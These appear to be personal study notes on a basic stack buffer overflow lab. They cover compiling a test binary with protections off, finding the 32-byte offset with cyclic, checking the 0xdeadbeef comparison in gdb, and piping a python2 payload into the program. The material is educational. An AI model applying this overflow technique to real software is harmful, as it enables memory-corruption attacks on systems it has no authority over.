Overwriting stack variable with a specific value

#gcc overwrite.c -o overwrite -fno-stack-protector -z execstack -no-pie -m32

./overwrite
32 characters
o/p : 12345678

increase by 4 bytes or 8 hex character or 4 Normal characters

can use cyclic 32

then cyclic 36

o/p for 36 char : 61616169

# cyclic -l 0x61616169
32

so 32 is the space assigned to buffer

what we can do is overflow the buffer and overwrite the value with the required one

# unhex 61616161

# gdb

info functions
disassemble do_input

0x080491e4 <+78>:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef

# break *main + 78
#info break
to delete a break point 
#del breakpointID

# x $ebp - 0xc
0xffffcd4c:	0x12345678

# set *0xffffcd4c = 0xdeadbeef
# c

Continuing.
good job!!
deadbeef

we can put deadbeef in ASCII and ask it to run properly

since its little endian, file command and if it says LSB(least significant bit then little endian

#python2 -c "print 32*'A' + '\xef\xbe\xad\xde'
the value we get from print is not recognisable so we cant send it to the program

if we use python3, we get different values

so do

# python2 -c "print 32*'A' + '\xef\xbe\xad\xde'" > payload
# ./overwrite  < payload

# run < payload
this time
0xffffcd4c:	0xdeadbeef

so just continue

rather that continuing, if just want to execute next instructions, 

# n

If we want to run exploit.py and want to see extra information

write in the script

context.log_level = 'debug'


